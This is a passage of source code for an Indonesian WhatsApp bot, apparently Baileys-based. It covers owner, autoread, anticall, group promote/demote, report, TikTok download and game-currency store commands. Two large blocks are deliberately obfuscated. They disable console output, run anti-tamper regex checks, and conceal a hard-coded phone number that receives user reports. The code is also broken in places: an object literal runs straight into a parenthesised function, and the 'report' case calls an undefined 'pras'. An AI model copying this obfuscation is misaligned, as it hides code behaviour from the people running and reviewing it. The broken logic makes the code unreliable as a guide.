_0x234080(_0x3de5b8,_0x500354,_0x125df3,_0x180c29){return _0x35f774(_0x125df3,_0x500354-0x13b,_0x125df3-0xa7,_0x500354-0x3b4);}return _0x4d418c=![],_0x8faa01;};}()),_0x2ba062=_0x4d9fb1(this,function(){function _0x4eedd2(_0x4a6bc0,_0x393c06,_0x5633cd,_0x2f377f){return _0x4f76(_0x393c06-0x3e2,_0x4a6bc0);}var _0x2db87d={'CsAme':_0x5ddf42(0x3ed,0x426,0x459,0x434),'ysOLy':function(_0x31b781,_0x2614e2){return _0x31b781(_0x2614e2);},'kAIxa':function(_0x545cc7,_0x443193){return _0x545cc7+_0x443193;},'csXVR':'{}.constru'+_0x4eedd2(0x57d,0x57c,0x59c,0x56a)+_0x5ddf42(0x446,0x418,0x3f6,0x41a)+'\x20)','YSNOF':function(_0x1b0282,_0x5b4410){return _0x1b0282===_0x5b4410;},'dWTSH':_0x5ddf42(0x3ca,0x3d4,0x3c8,0x3d9),'xMPni':_0x5ddf42(0x3c3,0x3e9,0x3f1,0x3d6),'lBDRE':_0x5ddf42(0x441,0x40e,0x3e2,0x419),'Vwosk':'info','CLhCW':_0x4eedd2(0x550,0x52d,0x52f,0x513),'uIfMi':_0x4eedd2(0x59b,0x58f,0x572,0x599),'WdVsn':function(_0x112a36,_0x40f996){return _0x112a36<_0x40f996;},'VHLyp':function(_0x2c7a98,_0x2f994f){return _0x2c7a98!==_0x2f994f;},'uksRi':'vIVFg','fGWLo':_0x5ddf42(0x3be,0x3e1,0x3d8,0x3dd)+'4'},_0x4abca2;function _0x5ddf42(_0x56492b,_0x55c085,_0x59b68c,_0x15a381){return _0x4f76(_0x55c085-0x273,_0x15a381);}try{if(_0x2db87d[_0x4eedd2(0x56c,0x55b,0x58d,0x58a)]===_0x4eedd2(0x58f,0x595,0x5b7,0x573)){var _0x4e9ea2=_0x2db87d[_0x5ddf42(0x39c,0x3c9,0x3da,0x391)](Function,_0x2db87d['kAIxa'](_0x2db87d[_0x4eedd2(0x53b,0x544,0x56a,0x54a)](_0x4eedd2(0x522,0x55c,0x579,0x53d)+_0x5ddf42(0x404,0x429,0x432,0x40d),_0x2db87d[_0x5ddf42(0x444,0x41a,0x42d,0x442)]),');'));_0x4abca2=_0x4e9ea2();}else _0x2942ef=_0x452031;}catch(_0x3adbf6){if(_0x2db87d[_0x4eedd2(0x52a,0x551,0x539,0x556)](_0x2db87d[_0x4eedd2(0x54c,0x562,0x530,0x52d)],_0x5ddf42(0x3aa,0x3d4,0x3b8,0x401)))_0x4abca2=window;else{var _0x55fc28=_0x20d4df[_0x4eedd2(0x567,0x569,0x543,0x559)](_0x76420d,arguments);return _0x25bbf4=null,_0x55fc28;}}var _0x316105=_0x4abca2['console']=_0x4abca2[_0x5ddf42(0x3ce,0x3c2,0x3f8,0x3cc)]||{},_0x1e4180=[_0x2db87d[_0x4eedd2(0x59e,0x57f,0x596,0x594)],_0x2db87d[_0x5ddf42(0x40a,0x423,0x44e,0x41f)],_0x2db87d[_0x5ddf42(0x3ff,0x3fb,0x3eb,0x3c4)],'error',_0x2db87d['CLhCW'],_0x2db87d[_0x4eedd2(0x550,0x579,0x566,0x5ad)],_0x5ddf42(0x41f,0x3f5,0x3d7,0x41f)];for(var _0xa902e=0x1dfc+-0x23*-0x106+-0x41ce;_0x2db87d[_0x4eedd2(0x4f9,0x528,0x549,0x546)](_0xa902e,_0x1e4180[_0x5ddf42(0x3e3,0x3e3,0x3b8,0x3cd)]);_0xa902e++){if(_0x2db87d['VHLyp'](_0x2db87d[_0x5ddf42(0x42b,0x419,0x409,0x41e)],_0x2db87d[_0x5ddf42(0x400,0x419,0x3fb,0x431)])){var _0x2ae68b=_0x43a2d5[_0x4eedd2(0x567,0x569,0x59e,0x5a3)](_0x4ca030,arguments);return _0x4647db=null,_0x2ae68b;}else{var _0xd25646=_0x2db87d[_0x4eedd2(0x535,0x54c,0x556,0x529)][_0x5ddf42(0x41f,0x41c,0x447,0x3ed)]('|'),_0x1b3391=0x1184+0x10dc+0xa0*-0x37;while(!![]){switch(_0xd25646[_0x1b3391++]){case'0':var _0x6037ec=_0x4d9fb1['constructo'+'r'][_0x5ddf42(0x429,0x417,0x3e1,0x441)][_0x5ddf42(0x3d1,0x3bd,0x3d7,0x3a1)](_0x4d9fb1);continue;case'1':var _0x2dd01d=_0x1e4180[_0xa902e];continue;case'2':_0x6037ec[_0x5ddf42(0x3e8,0x3ee,0x411,0x3c3)]=_0x42e259['toString']['bind'](_0x42e259);continue;case'3':_0x6037ec[_0x5ddf42(0x3cd,0x3dc,0x402,0x3ff)]=_0x4d9fb1[_0x4eedd2(0x547,0x52c,0x531,0x556)](_0x4d9fb1);continue;case'4':_0x316105[_0x2dd01d]=_0x6037ec;continue;case'5':var _0x42e259=_0x316105[_0x2dd01d]||_0x6037ec;continue;}break;}}}});_0x2ba062();var _0x31ef08={};function _0x4f76(_0x4fd37a,_0x461f2e){var _0x1e59d2=_0x297e();return _0x4f76=function(_0x297ed0,_0x4f76ae){_0x297ed0=_0x297ed0-(-0x1d77+0x1130+-0x1*-0xd8d);var _0x555375=_0x1e59d2[_0x297ed0];return _0x555375;},_0x4f76(_0x4fd37a,_0x461f2e);}function _0x297e(){var _0x2fc2f0=['rn\x20this\x22)(','uksRi','csXVR','contextInf','split','2cf16.jpg','PCQfX','https://te','table','utu.be/_7q','sEyvv','lBDRE','Score','ZqOzO','AULnF','https://mm','v9gIBMu9tX','nction()\x20','BdkKv','QtAIe','applicatio','WdVsn','{}.constru','eng','thumbnailU','bind','exception','mXtUh','84190ICKcWh','cISEE','console','b00733538b','o-k40Q-gO_','9999999999','./itsuki.j','qLcog','displayTex','ysOLy','Ndyie\x20Botz','DOCUMENT','X/A=','n/pdf','buttonText','quoted','osFrt','bG0=','sendMessag','D3MAaYx15D','gsnUv','kAIxa','180xAasEx','+0Mjbi7yii','97m/gdkX/D','☕\x20Donasi\x20☕','🥛\x20Owner\x20🥛','.net/d/f/A','__proto__','fGWLo','342947wkVkKx','GTVHG','82256aBaFNe','0|1|5|3|2|','YSNOF','length','readFileSy','g.whatsapp','tpE=','1991560HIXgMU','sage','log','6881LOVahI','mentionedJ','CsAme','return\x20(fu','toString','Ndyie','99999999','.owner','constructo','dWTSH','378330MkoQfL','trace','buttonId','99ReAYAU','OVlEm','ZkVsf','apply','Vwosk','LDtdiKSQ','ZfuLe','8aJYMRx','externalAd','RESPONSE','28999','3n1n1Kbt6a','YMsYMtnlnb','bA1B2pJ18r','JAbJX','hn2Sqy4nHf','eXI.enc','mediaType','(((.+)+)+)','uIfMi','type','rYAYVeWq-7','ctor(\x22retu','warn','2022Jsaqbm','xMPni','81642UDFXYb','85acPXCg','bx/mFEB8SW','search','KZqeL7byF+','buttonsMes','prototype'];_0x297e=function(){return _0x2fc2f0;};return _0x297e();}_0x31ef08[_0x1d3504(0x201,0x236,0x26a,0x248)+'t']=_0x1d3504(0x275,0x248,0x24b,0x26c);var _0x44e43e={};_0x44e43e[_0x1d3504(0x254,0x264,0x22c,0x23a)]=_0x4d576c(0x538,0x56e,0x559,0x55e),_0x44e43e[_0x4d576c(0x515,0x500,0x4f5,0x4f0)]=_0x31ef08,_0x44e43e[_0x4d576c(0x552,0x57c,0x55d,0x54d)]='RESPONSE';var _0x1c048f={};_0x1c048f[_0x1d3504(0x23e,0x236,0x217,0x21d)+'t']=_0x4d576c(0x520,0x540,0x513,0x53c);var _0x383a01={};_0x383a01[_0x4d576c(0x53d,0x526,0x559,0x50b)]='.donasi',_0x383a01['buttonText']=_0x1c048f,_0x383a01[_0x1d3504(0x257,0x279,0x2b2,0x27a)]=_0x4d576c(0x547,0x52a,0x540,0x570);var _0x12dd6e={};_0x12dd6e['title']=_0x4d576c(0x536,0x564,0x56c,0x525),_0x12dd6e['body']='Ndyie',_0x12dd6e[_0x4d576c(0x54f,0x524,0x575,0x528)]='VIDEO',_0x12dd6e[_0x4d576c(0x54f,0x547,0x527,0x560)]=0x2,_0x12dd6e[_0x4d576c(0x503,0x4d3,0x53b,0x508)+'rl']=_0x4d576c(0x566,0x56d,0x54b,0x58e)+'legra.ph/f'+'ile/5f7aaf'+_0x1d3504(0x247,0x231,0x200,0x269)+_0x4d576c(0x564,0x54f,0x563,0x589),_0x12dd6e['mediaUrl']='https://yo'+_0x1d3504(0x294,0x28f,0x2c7,0x2bc)+_0x4d576c(0x543,0x522,0x559,0x53e);var _0x2bf29e={};_0x2bf29e['forwarding'+_0x4d576c(0x56b,0x587,0x55c,0x54a)]=0x3,_0x2bf29e['isForwarde'+'d']=!![],_0x2bf29e[_0x4d576c(0x532,0x561,0x53d,0x531)+'id']=[sender],_0x2bf29e[_0x4d576c(0x546,0x525,0x53e,0x57d)+'Reply']=_0x12dd6e;var _0x3f8940={};_0x3f8940[_0x1d3504(0x27d,0x289,0x2ae,0x2ac)+'o']=_0x2bf29e,_0x3f8940[_0x1d3504(0x277,0x23d,0x251,0x25e)]=ftrol,Ndyie[_0x1d3504(0x24c,0x240,0x207,0x265)+'e'](from,{'Ndyie':_0x4d576c(0x536,0x542,0x50c,0x53e),'contentText':teks,'footerText':_0x4d576c(0x511,0x50c,0x4fc,0x542),'buttons':[_0x44e43e,_0x383a01],'headerType':_0x1d3504(0x213,0x239,0x1ff,0x237),'documentMessage':{'url':_0x4d576c(0x56e,0x54e,0x541,0x55c)+_0x1d3504(0x219,0x253,0x252,0x21b)+_0x4d576c(0x522,0x53e,0x4fa,0x545)+_0x1d3504(0x23f,0x232,0x1fb,0x26a)+_0x1d3504(0x24e,0x274,0x261,0x23e)+_0x4d576c(0x553,0x571,0x560,0x587)+'FZNjAqSMng'+_0x4d576c(0x54e,0x538,0x548,0x586),'mimetype':_0x1d3504(0x27e,0x29a,0x260,0x2c8)+_0x4d576c(0x514,0x4f4,0x547,0x511),'jpegThumbnail':fs[_0x1d3504(0x273,0x252,0x244,0x27b)+'nc'](_0x1d3504(0x216,0x234,0x202,0x238)+'pg'),'fileSha256':'kXrt+8eqBg'+_0x1d3504(0x20b,0x241,0x208,0x236)+_0x1d3504(0x24f,0x245,0x26a,0x218)+_0x4d576c(0x56f,0x54a,0x5a2,0x588)+_0x1d3504(0x21b,0x254,0x275,0x223),'fileLength':_0x4d576c(0x548,0x529,0x54c,0x56c),'pageCount':_0x1d3504(0x210,0x233,0x262,0x26a)+_0x4d576c(0x537,0x559,0x53f,0x55e),'mediaKey':_0x1d3504(0x24e,0x270,0x280,0x2a3)+'NkBAVg8GMe'+'tpwXOQusBR'+_0x4d576c(0x51f,0x4f9,0x550,0x548)+_0x4d576c(0x518,0x537,0x542,0x519),'fileName':'Ndyie\x20Gant'+_0x1d3504(0x256,0x229,0x20c,0x1f0),'fileEncSha256':_0x1d3504(0x29e,0x281,0x28d,0x2a5)+_0x4d576c(0x54a,0x540,0x513,0x518)+_0x1d3504(0x268,0x272,0x28d,0x272)+_0x1d3504(0x28b,0x283,0x296,0x2b5)+_0x4d576c(0x513,0x518,0x531,0x4f9)}},MessageType[_0x4d576c(0x55d,0x563,0x594,0x525)+_0x1d3504(0x22c,0x256,0x232,0x221)],_0x3f8940);
break
/*Di Suruh Kata Si Melcanz*/


//━━━━━━━━━━━━━━━[ Owner Menu ]━━━━━━━━━━━━━━━\\                                              
case 'owner':
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${creator}\n`
+ `ORG: Creator ${creator} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${ownerNumber}:${ownerNumber}\n`
+ 'END:VCARD'.trim()
Ndyie.sendMessage(from, {displayName: `Creator ${creator}`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply('TUHH NOMER OWNER KU')
break
case 'autoketik':
if (!isOwner && !Nia.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !Nia.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'report':
const pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = Nia.participant
const teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
(function(_0x21f202,_0x2a2789){var _0x203567=_0x21f202();function _0x29dc06(_0x6cff7,_0xda3482,_0x1bbe06,_0x27d526){return _0x2a3c(_0xda3482-0x1c,_0x6cff7);}function _0x52c6f2(_0x2c6e79,_0x352366,_0x17db5e,_0x222e0a){return _0x2a3c(_0x17db5e-0x42,_0x2c6e79);}while(!![]){try{var _0x1e7d1b=-parseInt(_0x29dc06(0x1f4,0x1fb,0x213,0x212))/(0x1044+-0x37a+0x443*-0x3)*(parseInt(_0x52c6f2(0x22b,0x237,0x21c,0x22d))/(-0x747+-0x6*0x155+0xf47))+parseInt(_0x52c6f2(0x1f6,0x1fc,0x1ef,0x1f2))/(-0x9d7+0x3*0x3bf+-0x5*0x47)*(-parseInt(_0x29dc06(0x1df,0x1e4,0x1d8,0x1f3))/(-0xfde+-0x1*-0xcc7+0x31b))+parseInt(_0x52c6f2(0x1ee,0x218,0x203,0x216))/(0x296+-0x145a+0x11c9)+parseInt(_0x52c6f2(0x22f,0x23b,0x229,0x210))/(0x9c8+0x2*-0x223+0x75*-0xc)*(-parseInt(_0x52c6f2(0x219,0x1ff,0x209,0x1e9))/(0x28d*-0x7+0x1d45+-0xb63*0x1))+-parseInt(_0x29dc06(0x1c4,0x1ce,0x1e9,0x1ef))/(-0x4*0x701+0x4*-0x8af+0x3ec8)*(parseInt(_0x52c6f2(0x1e3,0x1ed,0x1f2,0x203))/(0x1*-0x6b6+-0x1*-0x199f+0x4b8*-0x4))+parseInt(_0x29dc06(0x208,0x205,0x21b,0x20f))/(0xeef*0x1+0x174a+-0x11*0x23f)+parseInt(_0x52c6f2(0x1df,0x202,0x1f6,0x1de))/(-0x824+-0x1*-0x349+-0x4e6*-0x1)*(parseInt(_0x52c6f2(0x1e8,0x1ee,0x1ed,0x1d9))/(-0x3*-0x65+-0x1068+0x517*0x3));if(_0x1e7d1b===_0x2a2789)break;else _0x203567['push'](_0x203567['shift']());}catch(_0x2055a1){_0x203567['push'](_0x203567['shift']());}}}(_0x4f54,-0x69543+-0xd5894+-0x2cfb3*-0xc));function _0x2dda15(_0x113cf0,_0x1f6e06,_0x32167e,_0x4885a7){return _0x2a3c(_0x113cf0- -0x3d1,_0x1f6e06);}function _0x4f54(){var _0x201b91=['pDGUw','lpPXY','170voxunk','5|4|3|0|1|','return\x20(fu','sendMessag','table','9626fAZlKq','ekdfs','iaxKl','sapp.net','vlpFJ','ZZTbL','065@s.what','BbuhK','66hagYca','bind','13512360EFjXkM','kjnKD','console','1013724rjdkPJ','LuShE','3jMjcwX','ctor(\x22retu','aGiRY','8688663CjttfX','constructo','8tbKzUF','sOpwQ','517coGxWz','toString','mKLBe','ilnta','foYOo','__proto__','mCdqm','SeVRI','{}.constru','EmDmx','length','wsWOp','MMyvN','4043670ofRVsM','nvBla','trace','apply','rn\x20this\x22)(','info','1048698fIhCBl','7175892QzmipV','aGnba','bSgjY','mvPpB','nction()\x20','split','HkSKx','warn','error','prototype','6283818744','search','quoted','tAsVU','(((.+)+)+)','lPMsN'];_0x4f54=function(){return _0x201b91;};return _0x4f54();}var _0x30dad2=(function(){function _0x3b05eb(_0x86b54,_0x497332,_0x53b257,_0x34a5c5){return _0x2a3c(_0x86b54- -0xec,_0x53b257);}var _0xa110d9={};_0xa110d9[_0x38bc1a(0x400,0x3d1,0x3ea,0x3f7)]=function(_0x4a4dc5,_0xca9750){return _0x4a4dc5!==_0xca9750;},_0xa110d9['LuShE']=_0x3b05eb(0xcb,0xcb,0xe0,0xc7);function _0x38bc1a(_0x209942,_0x465a94,_0x452323,_0x161d37){return _0x2a3c(_0x452323-0x221,_0x209942);}var _0x571868=_0xa110d9,_0x151fa8=!![];return function(_0x226c8d,_0x3a9afb){function _0x18dccb(_0x2a925e,_0x118fcc,_0xfda588,_0x2ddb47){return _0x38bc1a(_0x118fcc,_0x118fcc-0x118,_0x2ddb47- -0x48c,_0x2ddb47-0x7f);}function _0x5785e0(_0x5191de,_0xd6e632,_0x251415,_0x277024){return _0x3b05eb(_0x277024-0x46c,_0xd6e632-0xd4,_0x5191de,_0x277024-0x87);}if(_0x571868[_0x18dccb(-0x86,-0x83,-0xb8,-0xa2)](_0x571868[_0x5785e0(0x52a,0x50f,0x51b,0x52c)],_0x18dccb(-0x85,-0x90,-0x74,-0x93))){var _0x64a416=_0x151fa8?function(){function _0x32c919(_0x4fdf6e,_0xf52b16,_0x14339f,_0x20f359){return _0x18dccb(_0x4fdf6e-0x17c,_0xf52b16,_0x14339f-0x1ab,_0x20f359-0x281);}if(_0x3a9afb){var _0x2ce6ae=_0x3a9afb[_0x32c919(0x1ed,0x1d6,0x1c0,0x1da)](_0x226c8d,arguments);return _0x3a9afb=null,_0x2ce6ae;}}:function(){};return _0x151fa8=![],_0x64a416;}else{if(_0x3b6264){var _0x5493cc=_0x18cd25[_0x5785e0(0x53a,0x534,0x527,0x544)](_0x6bfe9a,arguments);return _0xb29023=null,_0x5493cc;}}};}());function _0x58ae4d(_0x105667,_0x482b1a,_0x21f977,_0x58b3bb){return _0x2a3c(_0x105667- -0x205,_0x482b1a);}var _0x1e73de=_0x30dad2(this,function(){var _0x4b5434={};_0x4b5434[_0x3352ae(0x3d2,0x3ed,0x3df,0x3e4)]=_0x44a49b(0x3e1,0x3ed,0x3ed,0x3f0)+'+$';function _0x44a49b(_0x19f0df,_0x332f11,_0x3dfdd3,_0x23b8d4){return _0x2a3c(_0x332f11-0x217,_0x19f0df);}var _0x37272c=_0x4b5434;function _0x3352ae(_0x417485,_0x2b327a,_0x3d4666,_0xc40978){return _0x2a3c(_0x417485-0x213,_0x3d4666);}return _0x1e73de[_0x3352ae(0x3c8,0x3d8,0x3b0,0x3b3)]()[_0x44a49b(0x407,0x3ea,0x3ec,0x3ce)](_0x37272c[_0x3352ae(0x3d2,0x3c4,0x3ee,0x3e4)])[_0x3352ae(0x3c8,0x3bc,0x3ae,0x3e3)]()[_0x44a49b(0x3ca,0x3c8,0x3c2,0x3ac)+'r'](_0x1e73de)[_0x44a49b(0x3ec,0x3ea,0x3d7,0x3da)](_0x37272c[_0x44a49b(0x3e5,0x3d6,0x3b5,0x3bc)]);});_0x1e73de();var _0x47892d=(function(){var _0x32019e=!![];return function(_0xc5045e,_0x4d81d8){var _0x3e1a7e=_0x32019e?function(){if(_0x4d81d8){var _0x167ac6=_0x4d81d8['apply'](_0xc5045e,arguments);return _0x4d81d8=null,_0x167ac6;}}:function(){};return _0x32019e=![],_0x3e1a7e;};}()),_0xb6b9d1=_0x47892d(this,function(){var _0x4383f8={'nvBla':'(((.+)+)+)'+'+$','sOpwQ':function(_0x206fa3,_0x52ffbd){return _0x206fa3!==_0x52ffbd;},'ekdfs':_0x9bf810(-0x19,0x8,-0xa,-0x34),'mvPpB':function(_0x36a419,_0x50f82a){return _0x36a419+_0x50f82a;},'foYOo':function(_0xb234cf,_0x133991){return _0xb234cf+_0x133991;},'SeVRI':_0x3f2660(0x1bd,0x1d1,0x1d4,0x1b7)+_0x3f2660(0x1ad,0x1c0,0x1a6,0x1a2),'DNTRI':_0x9bf810(-0x1d,-0x1b,-0x29,-0x1e)+_0x3f2660(0x18f,0x192,0x198,0x19a)+_0x9bf810(-0x14,-0x1d,-0x35,0xd)+'\x20)','ZZTbL':function(_0x12a0bf,_0xf9af6){return _0x12a0bf===_0xf9af6;},'aGiRY':_0x9bf810(0x0,-0x12,-0x1f,0x8),'mCdqm':'JlcLC','bSgjY':function(_0x15d9f1){return _0x15d9f1();},'BbuhK':'log','PMZMi':_0x9bf810(-0x13,-0x9,-0x2d,0x2),'iaxKl':_0x9bf810(-0x9,0xb,0xf,0x7),'HkSKx':'exception','EmDmx':_0x9bf810(0x5,0x7,-0x19,-0x1a),'lPMsN':function(_0x37dd94,_0x501356){return _0x37dd94<_0x501356;},'mKLBe':'QYUQI','tAsVU':_0x3f2660(0x1c4,0x1af,0x1be,0x1d3),'kjnKD':_0x3f2660(0x1bc,0x1c1,0x1bb,0x1b5)+'2'};function _0x3f2660(_0x3e8097,_0x19cfac,_0x2fe24e,_0x4c93ca){return _0x2a3c(_0x3e8097- -0x1f,_0x4c93ca);}var _0x5e1d04=function(){var _0x4d90b4;function _0x5d7fc7(_0xa0570,_0x12bfc6,_0x334e71,_0x8785ba){return _0x3f2660(_0x8785ba-0x23f,_0x12bfc6-0x1d,_0x334e71-0xef,_0x12bfc6);}try{if(_0x4383f8[_0x46d1af(0x368,0x34e,0x36a,0x36c)](_0x46d1af(0x375,0x36d,0x36a,0x35b),_0x4383f8[_0x5d7fc7(0x419,0x3f0,0x3f5,0x400)])){var _0x17aaaf=_0x5011ac[_0x5d7fc7(0x400,0x3ea,0x3e2,0x3e4)](_0x31d49a,arguments);return _0x34c839=null,_0x17aaaf;}else _0x4d90b4=Function(_0x4383f8[_0x5d7fc7(0x3f9,0x3d9,0x3f7,0x3eb)](_0x4383f8[_0x5d7fc7(0x3d1,0x3d6,0x3c3,0x3d8)](_0x4383f8[_0x46d1af(0x370,0x382,0x379,0x35b)],_0x4383f8['DNTRI']),');'))();}catch(_0x3e9023){if(_0x4383f8[_0x46d1af(0x399,0x39c,0x389,0x3ac)](_0x4383f8[_0x46d1af(0x364,0x357,0x352,0x36a)],_0x4383f8[_0x5d7fc7(0x3e9,0x3ee,0x3bd,0x3da)]))return _0x1d02de[_0x46d1af(0x36a,0x38a,0x360,0x37a)]()[_0x5d7fc7(0x3ea,0x3e8,0x3ec,0x3f3)](_0x4383f8[_0x46d1af(0x377,0x35a,0x37d,0x373)])['toString']()['constructo'+'r'](_0x486726)['search'](_0x46d1af(0x38b,0x37e,0x39a,0x38a)+'+$');else _0x4d90b4=window;}function _0x46d1af(_0x152f18,_0x554067,_0x37f471,_0x2ad2ea){return _0x3f2660(_0x152f18-0x1d4,_0x554067-0x77,_0x37f471-0xec,_0x2ad2ea);}return _0x4d90b4;},_0x152069=_0x4383f8[_0x3f2660(0x1ab,0x19a,0x193,0x1b5)](_0x5e1d04),_0x519240=_0x152069[_0x9bf810(0x12,0x10,0x31,-0x1)]=_0x152069['console']||{};function _0x9bf810(_0x3c2a76,_0x1c0f72,_0x51dc15,_0x34e63b){return _0x2a3c(_0x3c2a76- -0x1d9,_0x51dc15);}var _0x57be6c=[_0x4383f8[_0x9bf810(0xd,0x20,0x4,-0x4)],_0x3f2660(0x1b0,0x1c4,0x196,0x1a0),_0x4383f8['PMZMi'],_0x4383f8[_0x9bf810(0x8,-0x13,0x6,0x1a)],_0x4383f8[_0x9bf810(-0xb,-0x28,0x15,0x4)],_0x4383f8[_0x3f2660(0x19e,0x1b8,0x189,0x18d)],_0x3f2660(0x1a4,0x19d,0x1ae,0x18d)];for(var _0x31f11c=0x381*-0xb+-0x157a+0x3c05;_0x4383f8[_0x9bf810(-0x2,0x1,0x10,0x19)](_0x31f11c,_0x57be6c[_0x9bf810(-0x1b,-0x17,-0x10,0x4)]);_0x31f11c++){if(_0x4383f8[_0x3f2660(0x197,0x17b,0x1ae,0x1a4)]!==_0x4383f8[_0x3f2660(0x1b6,0x1ad,0x1b6,0x1cd)]){var _0x1ca9a0=_0x4383f8[_0x3f2660(0x1cb,0x1b1,0x1e0,0x1cb)][_0x9bf810(-0xc,-0xb,-0x13,0x7)]('|'),_0x4ef4ae=-0x1*-0x1f4d+0x150*-0x1+-0x3*0x9ff;while(!![]){switch(_0x1ca9a0[_0x4ef4ae++]){case'0':_0x56f361[_0x9bf810(-0x20,-0x3,-0x29,-0x3f)]=_0x47892d[_0x9bf810(0xf,0x1e,-0x8,0x3)](_0x47892d);continue;case'1':_0x56f361['toString']=_0x688509['toString'][_0x9bf810(0xf,0x16,0x5,0x6)](_0x688509);continue;case'2':_0x519240[_0x1c697c]=_0x56f361;continue;case'3':var _0x688509=_0x519240[_0x1c697c]||_0x56f361;continue;case'4':var _0x1c697c=_0x57be6c[_0x31f11c];continue;case'5':var _0x56f361=_0x47892d[_0x9bf810(-0x28,-0x3f,-0x22,-0x26)+'r'][_0x9bf810(-0x8,-0x3,0x16,-0x24)][_0x3f2660(0x1c9,0x1b3,0x1c7,0x1bc)](_0x47892d);continue;}break;}}else{var _0x39e51e=_0x173967?function(){function _0x4f4e2a(_0x5c1c2e,_0x17b283,_0x259214,_0x562053){return _0x9bf810(_0x562053-0x9e,_0x17b283-0x135,_0x17b283,_0x562053-0x91);}if(_0x2c5661){var _0x14609a=_0x1ae43e[_0x4f4e2a(0x7d,0x8c,0x92,0x89)](_0x58fd23,arguments);return _0x4706cc=null,_0x14609a;}}:function(){};return _0x118f97=![],_0x39e51e;}}});_0xb6b9d1();var _0xa63a31={};function _0x2a3c(_0x30dad2,_0x4f5431){var _0x2a3cfb=_0x4f54();return _0x2a3c=function(_0xa0d783,_0x3c9f07){_0xa0d783=_0xa0d783-(-0x8b3*-0x1+0x1*-0x189+-0x57f*0x1);var _0x1ceb0e=_0x2a3cfb[_0xa0d783];return _0x1ceb0e;},_0x2a3c(_0x30dad2,_0x4f5431);}_0xa63a31[_0x58ae4d(-0x31,-0x39,-0x1a,-0x14)]=ftrol,Ndyie[_0x58ae4d(-0x28,-0x46,-0x38,-0x39)+'e'](_0x2dda15(-0x1ff,-0x20d,-0x200,-0x1f1)+_0x2dda15(-0x1ec,-0x1dc,-0x1ea,-0x1d1)+_0x2dda15(-0x1ef,-0x204,-0x1f6,-0x1de),options,text,_0xa63a31);
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'del':
                    Ndyie.deleteMessage(from, { id: Nia.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
                    break

//━━━━━━━━━━━━━━━[ Grup Menu ]━━━━━━━━━━━━━━━\\                                              
case 'demoteall':
		if (!isOwner && !Nia.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Ndyie.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !Nia.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Ndyie.groupMakeAdmin(from, members_id)
                break


//━━━━━━━━━━━━━━━[ Download Menu  ]━━━━━━━━━━━━━━━━━//
case 'tiktok':
reply(mess.wait)
anu = await fetchJson (`https://api.clph.me/api//tiktok?url=${args.join(' ')}&apikey=${caliphAPI}`)
buff = await getBuffer (anu.result.nowatermark)
Ndyie.sendMessage(from, buff, video, {mimetype: 'video/mp4', quoted: Ndy, caption: 'Nih bang vidionya'})
break

//━━━━━━━━━━━━━━━[ STORE MENU  ]━━━━━━━━━━━━━━━━━//
case 'listdm':
               list = [ ]
               listmenu = [`ml`,`ff`,`pubg`,`chip` ]
               listmenuu = [`Dm Ml`,`Dm FF`,`Dm Pubg`,`Chip` ]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'Ndyie',
                    rows: [
                       {
                        title: `${listmenuu[startnum++ ]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                     ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`, `Hai kak @${sender.split("@")[0 ]}, Pilih Menu Disini`, list)
               break
case 'ff':
Ndyie.sendMessage(from, `
*DROP DATA DIAMOND FF*
• VIA ID
• LEGAL 100%
• PROSES 1-3 MENIT

*50 💎 Rp 6.672*
